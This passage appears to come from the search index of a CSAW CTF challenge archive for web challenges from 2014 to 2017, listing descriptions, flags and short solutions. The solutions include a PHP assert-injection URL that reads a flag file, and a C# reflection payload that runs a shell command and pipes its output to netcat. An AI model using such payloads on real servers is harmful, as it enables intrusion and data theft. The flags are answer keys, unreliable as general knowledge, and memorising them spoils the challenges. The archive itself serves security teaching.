document and 4-byte big endian length of the document encoded in\n   hex and subsequent lines contain the contents of the document terminated by\n   end of file.\n\n   The GopherText format contains a list of Gopher/2 routes which the\n   client will then recursively request.\n\n\n2. The Internet Gopher/2 Model\n   Gopher/2 provides an optimized transport for Gopher semantics.\n   It supports all of the core features of Gopher but aims to be more\n   secure in several ways.\n\n   In essence, the Gopher protocol consists of a client connecting to a\n   server and sending the server a selector (a line of text, which may not\n   be empty) via a TCP connection.\n\n\n3. Gopher/2 Protocol Overview\n\n   In this simple example, the client establishes a connection and\n   requests the base page of the server.\n\n    {Client and server negotiate encryption key (See section 3.1)}\n    Client: {Sends a single forward slash Meaning \nList what you have\n}\n    /\n    Server: {Sends a series of lines, each ending in CR LF}\n    P17\n    T Welcome to our page\n    {Server closes connection}\n\n\n3.1. Connection Handshake\n\n   Connection will be established with a diffie-hellman key exchange.\n   This will establish the encryption key for subsequent communication\n   between client and server.\n\n   In the diffie-hellman exchange, let p = 251 and g = 6\n\n  Client: {Opens connection to web.chal.csaw.io at port 433 and\n           sends diffie-hellman A value.}\n  Server: {Accepts connection and says diffie hellman B value}\n  {Communication continues with messages encrypted by coordinated key}\n\n   The communication will be encrypted with repeated key xor using the\n   shared secret established by diffie hellman.\n\n\n3.2. Client Requests\n\n   Media item requests:\n\n  \nSelector\n    \nKey/Values...\n\n  /asdffile     Token1:ade912e4912b1c ...\n\n\n3.3. Server responses\n\n   The first line in a server response will be the item type followed by\n   the length of the return value encoded in hex. Subsequent lines will\n   be the content of the page. The following are the server response\n   types.\n\n  P   Item is a GopherText page\n  G   Item is a GIF format graphics file.\n  I   Item is some kind of image file.\n  S   Item is sound file (especially the WAV format).\n  F   Item is a file.\n\n\n   In the following example, the client requests a page on the server\n   with a token as an argument. The page the server returns will have a\n   Gopher2 media file in it. The client will reestablish another\n   connection to get the contents from the server.\n\n  {Client and server negotiate encryption key (See section 3.1)}\n  Client: {Sends magic string and session tokens}\n  /index username:uname sessionToken:eae12ade\n  Server: {Sends a series of lines, each ending in CR LF}\n  P41\n  T Welcome to our page, uname\n  I /imagename/png web.chal.csaw.io  433\n  {Connection closes}\n\n  {Client and server negotiate encryption key (See section 3.1)}\n  Client: {Sends a request for the image}\n  /imagename/png  username:uname sessionToken:eae12ade\n  Server: {Responds with file type and contents of PNG}\n  IDEAD\n  .PNG....\n  {Connection closes}\n\n\n4. GopherText Pages\n\n   The client software decides what items are available by looking at the\n   first character of each line in a directory listing. Augmenting this\n   list can extend the protocol.\n\n\n4.1. GopherText Static Text Types\n   A list of defined item-type characters. The client will decide how to\n   handle distinctions between text types.\n\n   Text type is formatted as follows:\n\n  \nItem Type\n \nText\n\n\n   The following are the available text types:\n\n  T   Text\n  E   Error\n\n\n4.2. GopherText Media Types\n\n   Used as this:\n\n  \nItem Type\n \nSelector\n \nHostname\n       \nPort\n \nKey/Values...\n\n  I           /asdf/png  web.chal.csaw.io 433    Token1:a912e4912b1c ...\n\n  Where the Selector also defines how the client will download the file.\n  E.g. /asdf/png will be downloaded as asdf.png\n  The client is disallowed from downloading files above the client\ns directory\n  for security purposes.\n\n   These are the following media item types.\n\n  G   Item is a GIF format graphics file. Client fetches and decides how\n       to display.\n  I   Item is some kind of image file. Client fetches and decides how to\n       display.\n  S   Item is sound file (especially the WAV format). Client will fetch\n       and play.\n  F   Item is a file. Client will fetch and download.\n  L   Item is a link to another Gopher/2 page.\n  P   Item is a nested browsing context. Client will fetch and render\n      as nested client.\n\n\n4.3. Session Storage Types\n\n   GopherText pages can return session storage entries to set Session\n   cookies on the client. The client will store it and append it to other\n   requests to the same server.\n\n  C  \nKey\n:\nValue\n        \nKey\n:\nValue\n       ...\n  C  Token1:Token1Value   Token2:Token2Value  ...\n\n\nSecurity Considerations\n\n   Gopher/2 addresses security issues by defining standards for\n   implementation of it\ns client and server with emphasis on cutting-edge\n   best advancements for cyber-security such as cyber-security through\n   obscurity, cyber-security through litigation, and cyber-security\n   through libel.\n\n\nExamples\n\n   An example implementation of Gopher/2 is available at\n\n      gopher://web.chal.csaw.io\n\n\n\n\n\nFlag\n\n\nflag{yeahsothatwasl!terallyjust100linesofpython!!!!!!!}\n\n\nSolution\n\n\nsolver.py\n\n\nSetup\n\n\nconfig goes into .env\nPART_TWO_PORT\nPART_TWO_HOSTNAME\nPORT\nHOSTNAME\nHave to be set correctly for the challenges to mesh together correctly\nHost on PORT 433 PLEASE\nInternally hosted on 433\nrun \n./setup", 
            "title": "Gopherz2Basic"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#gopherz2basic", 
            "text": "", 
            "title": "Gopherz2Basic"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#author", 
            "text": "Kent Ma   Leon Chou", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#description", 
            "text": "OSIRIS Laboratory                                                  K. Ma\nRequest for Comments: 42031337                                   L. Chou\nObsoletes: 1436                                      New York University\n                                                            October 2107\n\n\n           The Internet Gopher Protocol Version 2 (Gopher/2)\n\nStatus of This Memo\n\n   This memo specifies an Internet standards track protocol for the\n   Internet community. This document describes the protocol, lists some\n   of the implementations currently available, and has an overview of\n   how to implement new client and server applications.\n\n\nAbstract\n\n   This specification describes a modernized expression of the semantics\n   of the Gopher Internet protocol, referred to as Gopher version 2\n   (Gopher/2).\n\n   This specification obsoletes version 1 of the Internet Gopher\n   Protocol.\n\n\n1. Introduction\n\n   The Internet Gopher protocol is a wildly successful protocol.\n   It is currently the primary communications mechanisms for people\n   across the world. However it is missing several core mechanisms\n   for guaranteeing security. Additionally, it is lacking capabilities\n   for user interfaces and modern web document formatting.\n\n   The Gopher/2 defines a key exchange protocol for safe, end-to-end\n   encryption. Additionally, it defines a GopherText format for rendering\n   webpages.\n\n   The Internet Gopher/2 protocol and software follow a client-server\n   model. This model assumes reliable data stream; TCP is assumed.\n   Gopher/2 servers should listen on port 433. Documents reside on many\n   autonomous servers on the Internet. Users run client software on\n   their desktop, connecting to a server and completing a verification\n   process before sending the server a selector (a line of text, which\n   may not be empty) via a TCP connection at a well-known port. The server\n   responds with a block of text and closes the connection.\n\n   Servers return documents. The first line of the response contains the\n   type of the document and 4-byte big endian length of the document encoded in\n   hex and subsequent lines contain the contents of the document terminated by\n   end of file.\n\n   The GopherText format contains a list of Gopher/2 routes which the\n   client will then recursively request.\n\n\n2. The Internet Gopher/2 Model\n   Gopher/2 provides an optimized transport for Gopher semantics.\n   It supports all of the core features of Gopher but aims to be more\n   secure in several ways.\n\n   In essence, the Gopher protocol consists of a client connecting to a\n   server and sending the server a selector (a line of text, which may not\n   be empty) via a TCP connection.\n\n\n3. Gopher/2 Protocol Overview\n\n   In this simple example, the client establishes a connection and\n   requests the base page of the server.\n\n    {Client and server negotiate encryption key (See section 3.1)}\n    Client: {Sends a single forward slash Meaning  List what you have }\n    /\n    Server: {Sends a series of lines, each ending in CR LF}\n    P17\n    T Welcome to our page\n    {Server closes connection}\n\n\n3.1. Connection Handshake\n\n   Connection will be established with a diffie-hellman key exchange.\n   This will establish the encryption key for subsequent communication\n   between client and server.\n\n   In the diffie-hellman exchange, let p = 251 and g = 6\n\n  Client: {Opens connection to web.chal.csaw.io at port 433 and\n           sends diffie-hellman A value.}\n  Server: {Accepts connection and says diffie hellman B value}\n  {Communication continues with messages encrypted by coordinated key}\n\n   The communication will be encrypted with repeated key xor using the\n   shared secret established by diffie hellman.\n\n\n3.2. Client Requests\n\n   Media item requests:\n\n   Selector      Key/Values... \n  /asdffile     Token1:ade912e4912b1c ...\n\n\n3.3. Server responses\n\n   The first line in a server response will be the item type followed by\n   the length of the return value encoded in hex. Subsequent lines will\n   be the content of the page. The following are the server response\n   types.\n\n  P   Item is a GopherText page\n  G   Item is a GIF format graphics file.\n  I   Item is some kind of image file.\n  S   Item is sound file (especially the WAV format).\n  F   Item is a file.\n\n\n   In the following example, the client requests a page on the server\n   with a token as an argument. The page the server returns will have a\n   Gopher2 media file in it. The client will reestablish another\n   connection to get the contents from the server.\n\n  {Client and server negotiate encryption key (See section 3.1)}\n  Client: {Sends magic string and session tokens}\n  /index username:uname sessionToken:eae12ade\n  Server: {Sends a series of lines, each ending in CR LF}\n  P41\n  T Welcome to our page, uname\n  I /imagename/png web.chal.csaw.io  433\n  {Connection closes}\n\n  {Client and server negotiate encryption key (See section 3.1)}\n  Client: {Sends a request for the image}\n  /imagename/png  username:uname sessionToken:eae12ade\n  Server: {Responds with file type and contents of PNG}\n  IDEAD\n  .PNG....\n  {Connection closes}\n\n\n4. GopherText Pages\n\n   The client software decides what items are available by looking at the\n   first character of each line in a directory listing. Augmenting this\n   list can extend the protocol.\n\n\n4.1. GopherText Static Text Types\n   A list of defined item-type characters. The client will decide how to\n   handle distinctions between text types.\n\n   Text type is formatted as follows:\n\n   Item Type   Text \n\n   The following are the available text types:\n\n  T   Text\n  E   Error\n\n\n4.2. GopherText Media Types\n\n   Used as this:\n\n   Item Type   Selector   Hostname         Port   Key/Values... \n  I           /asdf/png  web.chal.csaw.io 433    Token1:a912e4912b1c ...\n\n  Where the Selector also defines how the client will download the file.\n  E.g. /asdf/png will be downloaded as asdf.png\n  The client is disallowed from downloading files above the client s directory\n  for security purposes.\n\n   These are the following media item types.\n\n  G   Item is a GIF format graphics file. Client fetches and decides how\n       to display.\n  I   Item is some kind of image file. Client fetches and decides how to\n       display.\n  S   Item is sound file (especially the WAV format). Client will fetch\n       and play.\n  F   Item is a file. Client will fetch and download.\n  L   Item is a link to another Gopher/2 page.\n  P   Item is a nested browsing context. Client will fetch and render\n      as nested client.\n\n\n4.3. Session Storage Types\n\n   GopherText pages can return session storage entries to set Session\n   cookies on the client. The client will store it and append it to other\n   requests to the same server.\n\n  C   Key : Value          Key : Value        ...\n  C  Token1:Token1Value   Token2:Token2Value  ...\n\n\nSecurity Considerations\n\n   Gopher/2 addresses security issues by defining standards for\n   implementation of it s client and server with emphasis on cutting-edge\n   best advancements for cyber-security such as cyber-security through\n   obscurity, cyber-security through litigation, and cyber-security\n   through libel.\n\n\nExamples\n\n   An example implementation of Gopher/2 is available at\n\n      gopher://web.chal.csaw.io", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#flag", 
            "text": "flag{yeahsothatwasl!terallyjust100linesofpython!!!!!!!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/#setup", 
            "text": "config goes into .env\nPART_TWO_PORT\nPART_TWO_HOSTNAME\nPORT\nHOSTNAME\nHave to be set correctly for the challenges to mesh together correctly\nHost on PORT 433 PLEASE\nInternally hosted on 433\nrun  ./setup", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/", 
            "text": "wtf.sh (1)\n\n\nAuthor\n\n\nJosh Hofing\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n$ man \n1\n wtf.sh\n\n\nWTF.SH(1)               Quals               WTF.SH(1)\n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You can get the flag to this first part of the\n       problem by getting  the  website  to  run  the\n       get_flag1  command. I heard the admin likes to\n       launch it when he visits his own profile.\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That  involve  childhood  trauma  of  too many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report  your  favorite  bugs  in   wtf.sh   at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh(2)\n\nCSAW 2016           September 2016          WTF.SH(1)\n\n\n\n\n\nFlag\n\n\nflag{l00k_at_m3_I_am_th3_4dm1n_n0w}\n\n\nSolution\n\n\nsolve1.sh\n\n\nwtf.sh(2)\n\n\nAuthor\n\n\nJosh Hofing\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n$ man \n2\n wtf.sh\n\nWTF.SH\n(\n2\n)\n               Quals               WTF.SH\n(\n2\n)\n\n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You  can  get  the flag to this second part of\n       the problem by getting the website to run  the\n       get_flag2 command. Sadly, I can\nt seem to find\n       anything in the code that does that :\n(\n Do  you\n       think you could take a look at it \nfor\n me?\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That involve  childhood  trauma  of  too  many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report   your   favorite  bugs  in  wtf.sh  at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh\n(\n1\n)\n\n\nCSAW \n2016\n           September \n2016\n          WTF.SH\n(\n2\n)\n\n\n\n\n\n\nFlag\n\n\nflag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}\n\n\nSolution\n\n\nsolve2.sh", 
            "title": "WTF.sh (1)"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#wtfsh-1", 
            "text": "", 
            "title": "wtf.sh (1)"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#author", 
            "text": "Josh Hofing", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#description", 
            "text": "$ man  1  wtf.sh  WTF.SH(1)               Quals               WTF.SH(1)\n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You can get the flag to this first part of the\n       problem by getting  the  website  to  run  the\n       get_flag1  command. I heard the admin likes to\n       launch it when he visits his own profile.\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That  involve  childhood  trauma  of  too many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report  your  favorite  bugs  in   wtf.sh   at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh(2)\n\nCSAW 2016           September 2016          WTF.SH(1)", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#flag", 
            "text": "flag{l00k_at_m3_I_am_th3_4dm1n_n0w}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#solution", 
            "text": "solve1.sh", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#wtfsh2", 
            "text": "", 
            "title": "wtf.sh(2)"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#author_1", 
            "text": "Josh Hofing", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#points_1", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#category_1", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#description_1", 
            "text": "$ man  2  wtf.sh\n\nWTF.SH ( 2 )                Quals               WTF.SH ( 2 ) \n\nNAME\n       wtf.sh - A webserver written in bash\n\nSYNOPSIS\n       wtf.sh port\n\nDESCRIPTION\n       wtf.sh is a webserver written in bash.\n       Do I need to say more?\n\nFLAG\n       You  can  get  the flag to this second part of\n       the problem by getting the website to run  the\n       get_flag2 command. Sadly, I can t seem to find\n       anything in the code that does that : (  Do  you\n       think you could take a look at it  for  me?\n\nACCESS\n       You can find wtf.sh at http://web.chal.csaw.io:8001/\n\nAUTHOR\n       Written  by  _Hyper_  http://github.com/Hyper-\n       sonic/\n\nSUPERHERO ORIGIN STORY\n       I have deep-rooted problems\n       That involve  childhood  trauma  of  too  many\n       shells\n       It was ksh, zsh, bash, dash\n       They just never stopped\n       On that day I swore I would have vengeance\n       I became\n       The Bashman\n\nREPORTING BUGS\n       Report   your   favorite  bugs  in  wtf.sh  at\n       http://ctf.csaw.io\n\nSEE ALSO\n       wtf.sh ( 1 ) \n\nCSAW  2016            September  2016           WTF.SH ( 2 )", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#flag_1", 
            "text": "flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/wtf.sh/#solution_1", 
            "text": "solve2.sh", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/", 
            "text": "Seizure Cipher\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nThrowback to last year\nDon't blink... or maybe you should so you don't get a seizure\n\n\nFlag\n\n\nFLAG{DENNO_SENSHI_PORYGON}\n\n\nSolution", 
            "title": "Seizure Cipher"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#seizure-cipher", 
            "text": "", 
            "title": "Seizure Cipher"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#description", 
            "text": "Throwback to last year\nDon't blink... or maybe you should so you don't get a seizure", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#flag", 
            "text": "FLAG{DENNO_SENSHI_PORYGON}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/Seizure-Cipher/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/MFW/", 
            "text": "MFW\n\n\nAuthor\n\n\nPoints\n\n\n125\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nHey, I made my first website today. It's pretty cool and web7.9.\n\n\nFlag\n\n\nflag{3vald_@ss3rt_1s_best_a$$ert\n\n\nSolution\n\n\nhttp\n://\nweb\n.\nchal\n.\ncsaw\n.\nio\n:\n8000\n/\nindex\n.\nphp\n?\npage\n=\nflag\n%\n27\n)||\nvar_dump\n(\nfile_get_contents\n(%\n27templates\n/\nflag\n.\nphp\n%\n27\n));//", 
            "title": "MFW"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#mfw", 
            "text": "", 
            "title": "MFW"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#points", 
            "text": "125", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#description", 
            "text": "Hey, I made my first website today. It's pretty cool and web7.9.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#flag", 
            "text": "flag{3vald_@ss3rt_1s_best_a$$ert", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/MFW/#solution", 
            "text": "http :// web . chal . csaw . io : 8000 / index . php ? page = flag % 27 )|| var_dump ( file_get_contents (% 27templates / flag . php % 27 ));//", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/", 
            "text": "Linq to the present\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nYo bro I found Trump's and Hilary's private chat server. I'm sure there is more dirt on the server.\n\n\nHint: Just because you have an exe, doesn't mean that it is running on a Windows server.\n\n\nnc web.chal.csaw.io 1340\n\n\nFlag\n\n\nflag{i_need_a_better_perscription_I_cant_seed_sharp}\n\n\nSolution\n\n\n.GetType().Assembly.GetType(\nSystem.AppDomain\n).GetMethods()[18].Invoke(\n.GetType().Assembly.GetType(\nSystem.AppDomain\n).GetProperty(\nCurrentDomain\n).GetValue(null), \nSystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process\n.Split(\n;\n.ToCharArray())).GetType().GetMethods()[80].Invoke(null, \nbash;-c \nls | nc 0 9001\n.Split(\n;\n.ToCharArray()))", 
            "title": "Linq to the Present"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#linq-to-the-present", 
            "text": "", 
            "title": "Linq to the present"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#description", 
            "text": "Yo bro I found Trump's and Hilary's private chat server. I'm sure there is more dirt on the server.  Hint: Just because you have an exe, doesn't mean that it is running on a Windows server.  nc web.chal.csaw.io 1340", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#flag", 
            "text": "flag{i_need_a_better_perscription_I_cant_seed_sharp}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/linq_to_the_present/#solution", 
            "text": ".GetType().Assembly.GetType( System.AppDomain ).GetMethods()[18].Invoke( .GetType().Assembly.GetType( System.AppDomain ).GetProperty( CurrentDomain ).GetValue(null),  System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process .Split( ; .ToCharArray())).GetType().GetMethods()[80].Invoke(null,  bash;-c  ls | nc 0 9001 .Split( ; .ToCharArray()))", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/", 
            "text": "K_{Stairs}\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttp://54.152.84.91\n\n\nFlag\n\n\nSolution\n\n\nHitting the site, we are welcomed with the following:\n\n\n\n\nImmediately we register and start looking around.\n\n\n\n\nSo, straight off the bat we notice that we were given 3 tokens for registering to play and there appears to be DLC content available to help us in our conquest.  After a lot of playing around and throwing things (the site was very slow and buggy at times), we noticed that if you register and then just logout and re-register it aggregates your tokens.\n\n\n\n\nDuring our recon we also noticed a hidden compass that said it costs 100 tokens.\n\n\n\n\nWe wasted a lot of time here trying to buy this upgraded compass by changing the \nbid\n parameter to \n4\n, as we thought perhaps it would give us an upper hand while actually playing the game.  No matter what we did we were always greeted with the \nnO-oP\n message.\n\n\n\n\n\n\nBefore you comment on the number of tokens being shown above while trying to purchase a \n100\n compass, these images were taken after the fact.  We had closer to \n200\n tokens available while testing and were never able to purchase this item.  So moving back to collecting tokens.  After we finished registering enough users, we went ahead and purchased the \n10\n token compass, a bunch of food, and headed off on our quest.\n\n\n\n\n\n\nThe compass basically was boolean in nature.  It would only tell you if you were going the right or wrong direction.  We took the approach of heading one direction until it tells us that that is no longer the correct direction and then turn and head the way the compass tells us.  Eventually we wind up finding a staircase.\n\n\n\n\nHeading up the stairs kills us, but only after revealing the flag.", 
            "title": "K_{Stairs}"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#k_stairs", 
            "text": "", 
            "title": "K_{Stairs}"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#description", 
            "text": "http://54.152.84.91", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/K_stairs-100/#solution", 
            "text": "Hitting the site, we are welcomed with the following:   Immediately we register and start looking around.   So, straight off the bat we notice that we were given 3 tokens for registering to play and there appears to be DLC content available to help us in our conquest.  After a lot of playing around and throwing things (the site was very slow and buggy at times), we noticed that if you register and then just logout and re-register it aggregates your tokens.   During our recon we also noticed a hidden compass that said it costs 100 tokens.   We wasted a lot of time here trying to buy this upgraded compass by changing the  bid  parameter to  4 , as we thought perhaps it would give us an upper hand while actually playing the game.  No matter what we did we were always greeted with the  nO-oP  message.    Before you comment on the number of tokens being shown above while trying to purchase a  100  compass, these images were taken after the fact.  We had closer to  200  tokens available while testing and were never able to purchase this item.  So moving back to collecting tokens.  After we finished registering enough users, we went ahead and purchased the  10  token compass, a bunch of food, and headed off on our quest.    The compass basically was boolean in nature.  It would only tell you if you were going the right or wrong direction.  We took the approach of heading one direction until it tells us that that is no longer the correct direction and then turn and head the way the compass tells us.  Eventually we wind up finding a staircase.   Heading up the stairs kills us, but only after revealing the flag.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/", 
            "text": "K_achieve\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategoru\n\n\nWeb\n\n\nDescription\n\n\nCan you beat it without taking damage?\n\nhttp://54.152.84.91\n\nHINT: State is split up into two parts\nHINT: The map is 256 x 256 and there are 8 types of tiles. Notice anything interesting about the length of the second chunk?\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://itszn.com/blog/?p=20", 
            "title": "K_{Achieve}"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#k_achieve", 
            "text": "", 
            "title": "K_achieve"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#categoru", 
            "text": "Web", 
            "title": "Categoru"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#description", 
            "text": "Can you beat it without taking damage? http://54.152.84.91 \nHINT: State is split up into two parts\nHINT: The map is 256 x 256 and there are 8 types of tiles. Notice anything interesting about the length of the second chunk?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/K_achieve-200/#solution", 
            "text": "http://itszn.com/blog/?p=20", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/big_data/", 
            "text": "Big Data\n\n\nAuthor\n\n\nCohen\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nSomething, something, data, something, something, big\n\n\nFlag\n\n\nflag{bigdataisaproblemnotasolution}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \npcap.pcapng", 
            "title": "Big Data"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#big-data", 
            "text": "", 
            "title": "Big Data"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#author", 
            "text": "Cohen", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#description", 
            "text": "Something, something, data, something, something, big", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#flag", 
            "text": "flag{bigdataisaproblemnotasolution}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/big_data/#setup", 
            "text": "Distribute  pcap.pcapng", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/web/Shia/", 
